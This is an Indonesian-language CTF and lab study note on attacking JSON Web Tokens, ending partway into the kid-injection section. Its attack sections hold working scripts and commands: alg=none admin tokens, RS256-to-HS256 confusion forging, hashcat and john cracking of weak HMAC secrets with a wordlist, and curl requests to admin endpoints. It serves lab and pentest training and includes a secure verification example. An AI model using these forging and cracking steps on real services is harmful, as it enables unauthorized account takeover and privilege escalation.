---
id: "28"
title: "🔐 28 — JWT Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "28_jwt_workflow.md"
refs_out: ["19","22","25","27","29","30","34"]
refs_in: ["14d","23","27","29","30","33","34","53","57","61"]
---

← [File 27: IDOR](/docs/idor-access-control)

# 🔐 28 — JWT Workflow

> **Category:** Web Exploitation  
> **Difficulty:** Fundamental → Advanced  
> **Type:** Authentication / Session / Access Control / Token Forgery  
> **Prerequisites:** File 01–27  
> **Primary Labs:** HackTheBox, TryHackMe, PortSwigger  
> **Environment:** Parrot OS XFCE / Debian-based  
> **Scope:** Seluruh teknik eksploitasi di file ini ditujukan untuk CTF, lab, atau sistem yang secara eksplisit mengizinkan pengujian.

> **Mental Model Utama**
> 
> ```text
> JWT = DATA + CRYPTOGRAPHIC INTEGRITY
> ```
> 
> Jangan terjebak pada asumsi:
> 
> ```text
> "Payload terlihat"
>       ≠
> "Payload bisa diubah"
> ```
> 
> Yang menentukan keamanan adalah apakah server:
> 
> ```text
> 1. memilih algorithm secara aman
> 2. memilih key secara aman
> 3. memverifikasi signature
> 4. memvalidasi claims
> 5. menerapkan authorization
> ```

---

# 📚 Daftar Isi

- [0 — Fundamentals](#0--fundamentals)
    
    - [0.1 Apa Itu JWT](#01-apa-itu-jwt)
        
    - [0.2 JWT Header Fields](#02-jwt-header-fields)
        
    - [0.3 JWT Payload Claims](#03-jwt-payload-claims)
        
    - [0.4 Signature Algorithms](#04-signature-algorithms)
        
- [1 — Reconnaissance JWT](#1--reconnaissance-jwt)
    
    - [1.1 Identifikasi JWT di Target](#11-identifikasi-jwt-di-target)
        
    - [1.2 Tools untuk JWT Analysis](#12-tools-untuk-jwt-analysis)
        
- [2 — Attack Techniques](#2--attack-techniques)
    
    - [2.1 None Algorithm Attack](#21-none-algorithm-attack)
        
    - [2.2 Algorithm Confusion RS256 → HS256](#22-algorithm-confusion-rs256--hs256)
        
    - [2.3 Weak Secret / Brute Force](#23-weak-secret--brute-force)
        
    - [2.4 `kid` Injection](#24-kid-injection)
        
    - [2.5 `jku` JWK Set URL Injection](#25-jku-jwk-set-url-injection)
        
    - [2.6 `jwk` Embedded JWK Attack](#26-jwk-embedded-jwk-attack)
        
    - [2.7 `x5u` / `x5c` Token Forgery](#27-x5u--x5c-token-forgery)
        
    - [2.8 Token Replay Attack](#28-token-replay-attack)
        
    - [2.9 JWT Information Disclosure](#29-jwt-information-disclosure)
        
- [3 — Claim Manipulation](#3--claim-manipulation)
    
    - [3.1 Role/Permission Manipulation](#31-rolepermission-manipulation)
        
    - [3.2 User ID Manipulation](#32-user-id-manipulation-jwt--idor)
        
    - [3.3 Expiry Manipulation](#33-expiry-manipulation)
        
- [4 — Tools Workflow](#4--tools-workflow)
    
    - [4.1 jwt_tool Complete Workflow](#41-jwt_tool-complete-workflow)
        
    - [4.2 Manual JWT Crafting](#42-python3-manual-jwt-crafting)
        
    - [4.3 hashcat JWT Cracking](#43-hashcat-jwt-cracking)
        
    - [4.4 Burp Suite JWT Testing](#44-burp-suite-jwt-testing)
        
- [5 — PortSwigger Lab Patterns](#5--portswigger-lab-patterns)
    
    - [5.1 Unverified Signature](#51-unverified-signature)
        
    - [5.2 Flawed Signature Verification](#52-flawed-signature-verification)
        
    - [5.3 Weak Signing Key](#53-weak-signing-key)
        
    - [5.4 JWK Header Injection](#54-jwk-header-injection)
        
    - [5.5 JKU Header Injection](#55-jku-header-injection)
        
    - [5.6 KID Path Traversal](#56-kid-path-traversal)
        
- [6 — Decision Tree](#6--decision-tree)
    
- [7 — Common Errors & Troubleshooting](#7--common-errors--troubleshooting)
    
- [8 — Golden Rules](#8--golden-rules)
    
- [9 — Final Checklist](#9--final-checklist)
    
- [10 — Cross-Workflow](#10--cross-workflow)
    
- [11 — One-Line Muscle Memory](#11--one-line-muscle-memory)
    

---

# 🧠 0 — Fundamentals

# 0.1 🔍 Apa Itu JWT

## Definisi

JWT (**JSON Web Token**) adalah format compact untuk membawa JSON claims yang dapat ditandatangani secara kriptografis.

JWT banyak dipakai untuk:

```text
Authentication
Session management
Authorization
API access
SSO
Identity propagation
```

JWT secara umum memiliki bentuk:

```text
HEADER.PAYLOAD.SIGNATURE
```

---

## Diagram Struktur JWT

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
                    .
eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciIsImV4cCI6MTk5OTk5OTk5OX0
                    .
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Secara visual:

```text
┌───────────────────────────────┐
│ HEADER                        │
│ eyJhbGciOiJIUzI1NiIs...      │
│                               │
│ alg = HS256                   │
│ typ = JWT                     │
└───────────────┬───────────────┘
                │
                .
                │
┌───────────────▼───────────────┐
│ PAYLOAD                       │
│ eyJzdWIiOiIxMDAi...           │
│                               │
│ sub  = 100                    │
│ role = user                    │
│ exp  = ...                    │
└───────────────┬───────────────┘
                │
                .
                │
┌───────────────▼───────────────┐
│ SIGNATURE                     │
│ SflKxwRJSMeKKF...             │
│                               │
│ HMAC/RSA/ECDSA/PSS/etc.       │
└───────────────────────────────┘
```

JWT header dan payload biasanya dikodekan Base64URL. Signature digunakan untuk memastikan integritas token menurut algoritma yang dipilih.

---

## Header Nyata

Contoh:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Base64URL:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

---

## Payload Nyata

Contoh:

```json
{
  "sub": "100",
  "username": "wiener",
  "role": "user",
  "iat": 1788744000,
  "exp": 1788747600
}
```

---

## Signature

Untuk HS256 secara konsep:

```text
HMAC-SHA256(
    base64url(header)
    +
    "."
    +
    base64url(payload),
    secret
)
```

Jadi:

```text
HEADER.PAYLOAD
       │
       ▼
   HMAC(secret)
       │
       ▼
   SIGNATURE
```

---

# 🧪 Decode Manual di Terminal

## Python3 One-Liner

```bash
# Decode the JWT payload locally without verifying its signature.
python3 -c 'import base64,json,sys; p=sys.argv[1].split(".")[1]; p += "="*((4-len(p)%4)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJ1c2VybmFtZSI6IndpZW5lciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzg4NzQ0MDAwLCJleHAiOjE3ODg3NDc2MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
```

Contoh output:

```text
{
  "sub": "100",
  "username": "wiener",
  "role": "user",
  "iat": 1788744000,
  "exp": 1788747600
}
```

> **Penting:** decoding payload tidak sama dengan verifying signature.

---

## Decode dengan Shell

```bash
# Extract and decode the header.
python3 -c 'import base64,sys; x=sys.argv[1].split(".")[0]; x += "="*((4-len(x)%4)%4); print(base64.urlsafe_b64decode(x).decode())' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJ1c2VybmFtZSI6IndpZW5lciIsInJvbGUiOiJ1c2VyIn0.signature_here'
```

```bash
# Extract and decode the payload.
python3 -c 'import base64,sys; x=sys.argv[1].split(".")[1]; x += "="*((4-len(x)%4)%4); print(base64.urlsafe_b64decode(x).decode())' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJ1c2VybmFtZSI6IndpZW5lciIsInJvbGUiOiJ1c2VyIn0.signature_here'
```

---

## jwt.io

Workflow:

```text
JWT
  ↓
jwt.io
  ↓
Decoded Header
  ↓
Decoded Payload
  ↓
Signature status
```

Gunakan untuk:

```text
decode
inspect
quick verification
manual experimentation
```

Jangan memasukkan token production/sensitif ke layanan online. Untuk CTF, gunakan token lab.

---

## jwt_tool

```bash
# Clone jwt_tool from its upstream repository.
git clone https://github.com/ticarpi/jwt_tool.git

# Enter the repository.
cd jwt_tool

# Install the Python dependencies.
python3 -m pip install -r requirements.txt

# Show the token's decoded header and payload.
python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here'
```

`jwt_tool` memang menyediakan decoding, tampering, verification, cracking, dan beberapa JWT attack modules.

---

# ⚖️ JWT vs Session Cookie

## Session Cookie

```text
Browser
   │
   ▼
session=abc123
   │
   ▼
Server
   │
   ▼
Session Store
```

Server menyimpan state.

---

## JWT

```text
Browser
   │
   ▼
JWT
   │
   ▼
Server
   │
   ├── Verify signature
   └── Read claims
```

JWT bisa mengurangi kebutuhan server-side session state, tetapi memperbesar pentingnya signature verification, key management, expiry, audience, dan revocation design.

### Kapan memakai?

|Kondisi|Cocok|
|---|---|
|Traditional web app|Session cookie sering lebih sederhana|
|Distributed APIs|JWT bisa berguna|
|Microservices|JWT sering digunakan|
|Need server-side revocation|Stateful session sering lebih mudah|
|Stateless authentication|JWT cocok jika implementasi benar|

---

# 🐍 Flask — Vulnerable vs Aman

## Vulnerable

```python
# Vulnerable example: trusts decoded claims without robust verification.
import jwt
from flask import request

@app.get("/admin")
def admin():
    token = request.cookies["session"]

    # Dangerous if signature verification is disabled or misconfigured.
    data = jwt.decode(
        token,
        options={"verify_signature": False}
    )

    if data.get("role") == "admin":
        return "Welcome admin"

    return "Forbidden", 403
```

---

## Aman

```python
# Secure example: explicitly restrict the expected algorithm and key.
import jwt
from flask import request

JWT_SECRET = "replace-with-long-random-secret"

@app.get("/admin")
def admin():
    token = request.cookies.get("session")

    if not token:
        return "Unauthorized", 401

    try:
        data = jwt.decode(
            token,
            JWT_SECRET,
            algorithms=["HS256"],
            audience="web-app",
            options={
                "require": ["exp", "sub"]
            }
        )
    except jwt.PyJWTError:
        return "Unauthorized", 401

    if data.get("role") != "admin":
        return "Forbidden", 403

    return "Welcome admin"
```

Inti keamanan:

```text
DO NOT:
decode → trust

DO:
decode + verify → validate claims → authorize
```

---

# 0.2 🧩 JWT Header Fields

|Field|Nama|Fungsi|Attack Vector|
|---|---|---|---|
|`alg`|Algorithm|Menentukan algoritma signature|`none`, algorithm confusion|
|`typ`|Type|Menunjukkan media/object type|parser confusion pada stack tertentu|
|`kid`|Key ID|Memilih verification key|path traversal, SQL injection|
|`jku`|JWK Set URL|Menunjuk lokasi JWKS|attacker-controlled key source|
|`x5u`|X.509 URL|Menunjuk certificate|attacker-controlled certificate source|
|`x5c`|X.509 chain|Membawa certificate chain|self-signed key injection/parser issues|
|`jwk`|JSON Web Key|Menyertakan key langsung|self-signed JWK injection|

JWT/JWS hanya mewajibkan `alg`; parameter lain dapat muncul sesuai implementasi. PortSwigger secara khusus menyoroti `jwk`, `jku`, dan `kid` sebagai header yang relevan untuk security testing.

---

## `alg`

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Server seharusnya **tidak membiarkan attacker menentukan algorithm yang diterima secara bebas**.

Attack possibilities:

```text
HS256 → weak secret
RS256 → HS256 confusion
none → missing signature verification
```

---

## `typ`

```json
{
  "typ": "JWT"
}
```

Biasanya informational.

Tetapi pada parser/application tertentu, perbedaan token type dapat menyebabkan confusion.

### 📌 Kapan Digunakan

Periksa ketika aplikasi menggunakan:

```text
JWT
JWS
nested tokens
multiple token types
```

---

## `kid`

Contoh:

```json
{
  "alg": "HS256",
  "kid": "primary"
}
```

Kemungkinan backend:

```text
kid=primary
   ↓
database/file/key-store
   ↓
secret
```

Jika `kid` masuk secara langsung ke:

```text
SQL query
filesystem path
key lookup
```

muncul attack surface.

---

## `jku`

Contoh:

```json
{
  "alg": "RS256",
  "jku": "https://example.test/jwks.json"
}
```

Server mungkin:

```text
jku
 ↓
fetch JWKS
 ↓
find kid
 ↓
get public key
 ↓
verify signature
```

Jika server menerima domain attacker:

```text
jku → attacker server
```

attacker dapat mengontrol verification key.

---

## `x5u`

Konsep serupa:

```text
x5u
 ↓
fetch certificate
 ↓
derive verification key
```

Attack:

```text
attacker URL
      ↓
malicious certificate
      ↓
signature validation
```

---

## `x5c`

Certificate chain dapat dimasukkan langsung.

Secara security:

```text
trusted certificate
      vs
attacker supplied certificate
```

Jika implementation mempercayai certificate yang dikirim sendiri, dapat terjadi key injection. PortSwigger juga mencatat `x5c` sebagai parameter yang patut diperhatikan.

---

## `jwk`

Contoh header:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "...",
    "e": "AQAB"
  }
}
```

Jika server menggunakan JWK dari token tanpa memastikan key tersebut trusted:

```text
attacker private key
      +
attacker public key embedded in JWK
      ↓
server verifies with attacker's key
```

Itulah inti `jwk` injection.

---

### 📌 Kapan Digunakan

Selalu inspect:

```text
alg
kid
jku
jwk
x5u
x5c
```

sebelum memilih attack.

---

# 0.3 📦 JWT Payload Claims

|Claim|Nama|Fungsi|Attack Vector|
|---|---|---|---|
|`sub`|Subject|Identitas subject|impersonation / IDOR|
|`iss`|Issuer|Penerbit token|issuer confusion|
|`aud`|Audience|Intended recipient|token replay across apps|
|`exp`|Expiration|Masa berlaku|missing expiry validation|
|`nbf`|Not Before|Token belum valid sebelum waktu tertentu|time validation flaw|
|`iat`|Issued At|Waktu pembuatan|replay/logic issues|
|`jti`|JWT ID|Identifier token|replay/revocation issues|
|`role`|Custom role|Privilege level|privilege escalation|
|`user_id`|Custom identity|User reference|IDOR / impersonation|
|`is_admin`|Custom boolean|Admin status|privilege escalation|
|`permissions`|Custom ACL|Fine-grained privileges|unauthorized actions|

---

## Critical Claims

Paling penting:

```text
sub
role
user_id
is_admin
permissions
aud
iss
exp
nbf
```

Mental model:

```text
Identity:
sub/user_id

Authority:
role/is_admin/permissions

Validity:
exp/nbf/iat

Trust boundary:
iss/aud
```

---

### 📌 Kapan Digunakan

Setelah decode JWT, langsung scan claims di atas.

---

# 0.4 🔐 Signature Algorithms

|Algorithm|Tipe|Key|Kekuatan|Kelemahan|Attack|
|---|---|---|---|---|---|
|HS256|HMAC|Shared secret|kuat jika secret random|secret bisa di-bruteforce|weak secret|
|HS384|HMAC|Shared secret|kuat|same shared-secret problem|weak secret|
|HS512|HMAC|Shared secret|kuat|same shared-secret problem|weak secret|
|RS256|RSA|private/public|kuat|implementation/key confusion risk|RS→HS|
|RS384|RSA|private/public|kuat|implementation/key confusion risk|RS→HS|
|RS512|RSA|private/public|kuat|implementation/key confusion risk|RS→HS|
|ES256|ECDSA|private/public|kuat|implementation complexity|confusion/misuse|
|ES384|ECDSA|private/public|kuat|implementation complexity|confusion/misuse|
|ES512|ECDSA|private/public|kuat|implementation complexity|confusion/misuse|
|PS256|RSA-PSS|private/public|kuat|implementation/config issues|confusion if accepted|
|`none`|None|none|tidak ada integrity|token unsigned|signature bypass|

---

## Symmetric vs Asymmetric

### HMAC

```text
             SECRET
             /    \
            /      \
       signer      verifier
```

Kedua pihak memakai secret sama.

Masalah:

```text
secret leaked
    ↓
forge token
```

---

### RSA/ECDSA/PSS

```text
PRIVATE KEY
     │
     ▼
   SIGN

PUBLIC KEY
     │
     ▼
  VERIFY
```

Public key memang boleh diketahui publik.

Karena itu:

```text
"public key diketahui"
        ≠
"JWT bisa diforge"
```

Algorithm confusion terjadi jika implementasi mencampurkan semantic key/type secara tidak aman. PortSwigger secara khusus menjelaskan RS256→HS256 sebagai misuse di mana public key diperlakukan sebagai HMAC secret.

---

# 🔎 1 — Reconnaissance JWT

# 1.1 🕵️ Identifikasi JWT di Target

JWT biasanya ditemukan pada:

```text
Authorization header
Cookie
localStorage
sessionStorage
response body
URL fragment
API response
```

---

## Authorization Header

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

---

## Cookie

```http
Cookie: session=eyJhbGciOiJIUzI1NiJ9...
```

---

## localStorage

Browser DevTools:

```text
Application
   ↓
Local Storage
   ↓
session / token / access_token
```

---

## Identify dari Bentuk

JWT compact JWS biasanya:

```text
xxxxx.yyyyy.zzzzz
```

Tiga segment:

```text
HEADER
  .
PAYLOAD
  .
SIGNATURE
```

Segment menggunakan Base64URL characters:

```text
A-Z
a-z
0-9
-
_
```

---

## Grep JWT dari Response

```bash
# Save an authorized lab response locally.
curl -s \
  http://TARGET/profile \
  -o response.txt
```

```bash
# Search for common three-part JWT patterns.
grep -Eo 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' response.txt
```

---

## Grep JWT dari JS

```bash
# Download a JavaScript bundle discovered from the application.
curl -s \
  http://TARGET/static/app.js \
  -o app.js
```

```bash
# Search the JavaScript bundle for JWT-like strings and token-related keywords.
grep -Ein 'eyJ|access_token|id_token|Authorization|Bearer|localStorage|sessionStorage' app.js
```

---

## Decode Claims

```bash
# Decode the payload of a discovered lab JWT.
python3 -c 'import base64,json; t="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here"; p=t.split(".")[1]; p+="="*((4-len(p)%4)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))'
```

---

### 📌 Kapan Digunakan

JWT recon dilakukan **sebelum login-flow testing lebih dalam**, karena token dapat menjadi pusat:

```text
authentication
authorization
IDOR
API access
SSO
```

---

# 1.2 🧰 Tools untuk JWT Analysis

## jwt_tool

```bash
# Clone jwt_tool.
git clone https://github.com/ticarpi/jwt_tool.git

# Enter the repository.
cd jwt_tool

# Install dependencies.
python3 -m pip install -r requirements.txt
```

---

## Manual Python3

```bash
# Verify that Python 3 is available.
python3 --version
```

---

## CyberChef

Gunakan recipe:

```text
From Base64
```

dengan URL-safe handling bila diperlukan.

Mental model:

```text
JWT
 ↓
split(".")
 ↓
decode header
 ↓
decode payload
```

---

## Burp Suite JWT Editor

Install:

```text
Burp
→ Extensions
→ BApp Store
→ JWT Editor
```

JWT Editor menyediakan visual handling untuk:

```text
decode
modify
generate keys
resign
```

PortSwigger mendokumentasikan JWT Editor sebagai workflow utama untuk eksperimen JWT di Burp.

---

## jwt.io

Gunakan:

```text
decode
inspect
verify
```

hanya dengan token lab/safe token.

---

## hashcat

JWT HMAC cracking menggunakan:

```text
-m 16500
```

PortSwigger juga merekomendasikan hashcat untuk brute-forcing weak JWT signing secrets.

---

# 🔥 2 — Attack Techniques

# 2.1 🚫 None Algorithm Attack

## Konsep

JWT dapat secara formal memiliki:

```json
{
  "alg": "none"
}
```

yang berarti tidak ada cryptographic signature.

Server aman harus menolak token unsigned untuk flow authentication.

Flawed implementation:

```text
JWT
 ↓
alg=none
 ↓
skip verification
 ↓
trust payload
```

PortSwigger mencatat bahwa token unsigned tetap memiliki trailing dot setelah payload.

---

## Original Token

Contoh token realistis:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload:

```json
{
  "sub": "wiener",
  "role": "user"
}
```

---

## Craft `alg=none`

```bash
# Craft an unsigned JWT with administrator identity for a CTF/lab.
python3 - <<'PY'
import base64
import json

def b64(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "sub": "administrator",
    "role": "admin"
}

token = b64(header) + "." + b64(payload) + "."

print(token)
PY
```

Contoh hasil:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.
```

---

## Variasi `none`

Test case variants:

```text
none
None
NONE
nOnE
```

### `none`

```bash
# Build a lower-case "none" algorithm token.
python3 - <<'PY'
import base64,json
b=lambda x:base64.urlsafe_b64encode(json.dumps(x,separators=(",",":")).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"administrator","role":"admin"})+".")
PY
```

### `None`

```bash
# Build a mixed-case "None" algorithm token.
python3 - <<'PY'
import base64,json
b=lambda x:base64.urlsafe_b64encode(json.dumps(x,separators=(",",":")).encode()).rstrip(b"=").decode()
print(b({"alg":"None","typ":"JWT"})+"."+b({"sub":"administrator","role":"admin"})+".")
PY
```

### `NONE`

```bash
# Build an upper-case "NONE" algorithm token.
python3 - <<'PY'
import base64,json
b=lambda x:base64.urlsafe_b64encode(json.dumps(x,separators=(",",":")).encode()).rstrip(b"=").decode()
print(b({"alg":"NONE","typ":"JWT"})+"."+b({"sub":"administrator","role":"admin"})+".")
PY
```

### `nOnE`

```bash
# Build a mixed-case "nOnE" algorithm token.
python3 - <<'PY'
import base64,json
b=lambda x:base64.urlsafe_b64encode(json.dumps(x,separators=(",",":")).encode()).rstrip(b"=").decode()
print(b({"alg":"nOnE","typ":"JWT"})+"."+b({"sub":"administrator","role":"admin"})+".")
PY
```

---

## curl Test

```bash
# Send the crafted unsigned JWT as a session cookie to the lab admin endpoint.
curl -i \
  -H 'Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.' \
  http://TARGET/admin
```

Expected vulnerable result:

```text
HTTP/1.1 200 OK

<h1>Admin panel</h1>
```

Secure result:

```text
HTTP/1.1 401 Unauthorized
```

atau:

```text
HTTP/1.1 403 Forbidden
```

---

### 📌 Kapan Digunakan

Prioritaskan:

```text
JWT found
+
signature behavior suspicious
```

terutama bila aplikasi terlihat mempercayai token tanpa strict algorithm enforcement.

---

# 2.2 🔄 Algorithm Confusion RS256 → HS256

## Visual Explanation

Ini salah satu konsep terpenting.

Server awal:

```text
RS256

PRIVATE KEY
   │
   ▼
 SIGN
   │
   ▼
JWT

PUBLIC KEY
   │
   ▼
VERIFY
```

Attacker memanfaatkan flawed implementation:

```text
Expected:
RS256 → RSA VERIFY(public key)

Forged:
HS256 → HMAC VERIFY(secret)
```

Jika server mengambil **RSA public key** dan menyerahkannya sebagai **HMAC secret**:

```text
RSA PUBLIC KEY
      │
      │ misinterpreted as
      ▼
HMAC SECRET
      │
      ▼
HS256 signature
      │
      ▼
Server accepts
```

PortSwigger menjelaskan ini sebagai algorithm confusion dan menggunakan public key untuk menandatangani token yang kemudian diverifikasi secara salah sebagai HS256.

---

## Kapan Bisa?

Diperlukan:

```text
1. Target memakai RS256/ES*/PS*
2. Public key tersedia/dapat diperoleh
3. Server salah mempercayai alg dari token
4. Server menerima symmetric algorithm
5. Public key digunakan sebagai HMAC secret
```

---

## Dapatkan Public Key

Beberapa aplikasi expose:

```text
/.well-known/jwks.json
/jwks.json
/api/keys
/oauth/jwks
```

Test:

```bash
# Check for a common JWKS endpoint in an authorized lab.
curl -i \
  http://TARGET/.well-known/jwks.json
```

---

## Contoh Public Key

```bash
# Download a public key discovered in the lab.
curl -s \
  http://TARGET/public.pem \
  -o public.pem
```

Check:

```bash
# Inspect the PEM header.
head -5 public.pem
```

Expected:

```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
...
-----END PUBLIC KEY-----
```

---

## Generate Forged Token

Menggunakan Python + PyJWT:

```bash
# Install PyJWT and a crypto backend for local lab experimentation.
python3 -m pip install pyjwt cryptography
```

Script:

```bash
# Create an HS256 token using the RSA public key as the HMAC secret.
python3 - <<'PY'
import jwt

with open("public.pem", "rb") as f:
    public_key = f.read()

payload = {
    "sub": "administrator",
    "role": "admin"
}

token = jwt.encode(
    payload,
    public_key,
    algorithm="HS256"
)

print(token)
PY
```

> Pada beberapa modern PyJWT versions/library combinations, menggunakan PEM public key secara langsung untuk HS256 dapat sengaja ditolak sebagai unsafe (Key error / InvalidKey).

### ✅ Solusi Konkret untuk Algorithm Confusion di CTF Modern:

1. **Opsi 1 — Gunakan Raw Bytes Public Key (Bukan PEM object)**:
   ```python
   import jwt

   with open("public.pem", "rb") as f:
       public_key_bytes = f.read()

   # Pass raw bytes (string/bytes), bukan PEM RSA key object
   token = jwt.encode(
       {"sub": "administrator", "role": "admin"},
       public_key_bytes,
       algorithm="HS256"
   )
   print(token)
   ```

2. **Opsi 2 — Gunakan `jwt_tool` (Lebih Reliable)**:
   ```bash
   python3 jwt_tool.py TOKEN -X k -pk public.pem
   ```

3. **Opsi 3 — Gunakan Burp JWT Editor Extension**:
   - Tab JWT Editor -> `New RSA Key` -> Paste Public Key -> `Attack` -> `Sign with HS256 using RSA public key`.

---

## curl

```bash
# Send the forged algorithm-confusion token to the lab admin endpoint.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/admin
```

Atau:

```bash
# Send the forged token as a session cookie.
curl -i \
  -H 'Cookie: session=FORGED_TOKEN' \
  http://TARGET/admin
```

---

## jwt_tool

> **Tooling correction:** pada jwt_tool current/upstream usage, **key confusion** menggunakan `-X k -pk public.pem`. `-X s` adalah **spoof JWKS / JKU-related attack**, bukan algorithm confusion. Ini penting karena beberapa cheat sheet lama menukar flag tersebut.

```bash
# Test key/algorithm confusion with an RSA public key.
python3 jwt_tool.py \
  'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.signature_here' \
  -X k \
  -pk public.pem
```

---

### 📌 Kapan Digunakan

Flow:

```text
RS256 detected
     ↓
Public key available?
     ↓
YES
     ↓
Try algorithm confusion
```

Jangan mencoba jika:

```text
server strictly pins RS256
```

dan:

```text
HS256 rejected
```

---

# 2.3 🔓 Weak Secret / Brute Force

## Konsep

HS256 menggunakan:

```text
secret
```

untuk signing dan verification.

Jika:

```text
secret = password123
```

maka attacker dapat melakukan:

```text
JWT
 ↓
offline HMAC verification
 ↓
dictionary
 ↓
candidate secret
 ↓
match
```

Tidak perlu mengirim satu request ke server untuk setiap candidate.

PortSwigger menekankan bahwa weak HMAC secret dapat di-bruteforce offline dan kemudian digunakan untuk memalsukan claims.

---

## Common Secrets Wordlist

Mini CTF list:

```text
secret
password
password123
admin
admin123
123456
12345678
qwerty
qwerty123
letmein
welcome
changeme
secret123
jwtsecret
jwt-secret
jwt_secret
mysecret
supersecret
test
test123
dev
development
production
default
default123
key
secretkey
secret-key
private
token
```

Buat file:

```bash
# Create a small CTF-focused JWT secret list.
cat > jwt_secrets.txt <<'EOF'
secret
password
password123
admin
admin123
123456
12345678
qwerty
qwerty123
letmein
welcome
changeme
secret123
jwtsecret
jwt-secret
jwt_secret
mysecret
supersecret
test
test123
dev
development
production
default
default123
key
secretkey
secret-key
private
token
EOF
```

---

## hashcat

Simpan token persis:

```bash
# Save the target JWT as a single line for hashcat.
printf '%s\n' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' > token.txt
```

Crack:

```bash
# Run a dictionary attack against a JWT using hashcat mode 16500.
hashcat -a 0 -m 16500 token.txt jwt_secrets.txt
```

PortSwigger/jwt_tool documentation currently uses `-m 16500` for JWT cracking.

---

## Contoh Output

```text
# Example realistic hashcat output.
eyJhbGciOiJIUzI1NiJ9.eyJ....:secret123 
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Time.Started.....: 13:40:12
Recovered........: 1/1
```

Untuk menampilkan hasil:

```bash
# Show cracked hashes and recovered secrets.
hashcat -m 16500 token.txt jwt_secrets.txt --show
```

Contoh:

```text
eyJhbGciOiJIUzI1NiIs...:secret123
```

---

## john

```bash
# Save the JWT in a john-readable file.
printf '%s\n' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' > jwt.txt
```

```bash
# Attempt a wordlist attack with John the Ripper when JWT support is available.
john --wordlist=jwt_secrets.txt jwt.txt
```

```bash
# Display recovered credentials.
john --show jwt.txt
```

---

## Custom Wordlist

Targeted words:

```bash
# Build a targeted lab wordlist from application terms.
cat > custom.txt <<'EOF'
wiener
administrator
web
portal
internal
acme
acme2026
acmesecret
jwt
jwtsecret
EOF
```

Run:

```bash
# Try the targeted secret list first.
hashcat -a 0 -m 16500 token.txt custom.txt
```

---

## Verify Secret

```bash
# Verify the recovered secret by decoding and validating the signature locally.
python3 - <<'PY'
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

print(
    jwt.decode(
        token,
        "secret123",
        algorithms=["HS256"]
    )
)
PY
```

Expected:

```text
{'sub': '100', 'role': 'user'}
```

---

## Forge Setelah Secret Ditemukan

```bash
# Sign a modified admin token using the recovered lab secret.
python3 - <<'PY'
import jwt

token = jwt.encode(
    {
        "sub": "administrator",
        "role": "admin"
    },
    "secret123",
    algorithm="HS256"
)

print(token)
PY
```

curl:

```bash
# Test the forged token against the lab admin endpoint.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/admin
```

### 📌 Kapan Digunakan

Gunakan:

```text
HS256/HS384/HS512
      ↓
weak-secret suspicion
      ↓
offline cracking
```

---

# 2.4 🗝️ `kid` Injection

## Konsep

`kid` digunakan server untuk memilih key.

Misalnya:

```json
{
  "alg": "HS256",
  "kid": "primary"
}
```

Backend dapat melakukan:

```text
kid
 ↓
key lookup
```

Jika implementation:

```text
kid → filesystem
```

mungkin terjadi path traversal.

Jika:

```text
kid → SQL query
```

